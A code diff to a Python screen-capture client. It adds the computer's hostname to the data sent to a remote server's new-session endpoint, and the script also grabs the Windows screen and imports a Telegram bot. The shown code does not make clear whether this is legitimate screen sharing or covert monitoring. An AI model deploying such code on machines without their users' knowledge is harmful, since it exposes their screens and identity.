@@ -9,6 +9,7 @@ import requests
 import time
 import argparse
 import uuid
+import socket  # Import socket module
 
 from telegram import Bot
 
@@ -28,9 +29,12 @@ def main(host=DEFAULT_HOST, key=None):
     if key is None:
         key = generate_unique_key()
 
+    # Get the computer name
+    computer_name = socket.gethostname()
+    
     print(f'Sending key "{key}" to server at {host}')
 
-    r = requests.post(f'{host}/new_session', json={'_key': key})
+    r = requests.post(f'{host}/new_session', json={'_key': key, 'computer_name': computer_name})  # Include computer name
     if r.status_code != 200:    
         print('Server not available.')
         return
@@ -62,7 +66,7 @@ def main(host=DEFAULT_HOST, key=None):
         bmpinfo = screenshot.GetInfo()
 
         # copy into memory 
-        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),win32con.SRCCOPY)
+        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
 
         bmpstr = screenshot.GetBitmapBits(True)
 
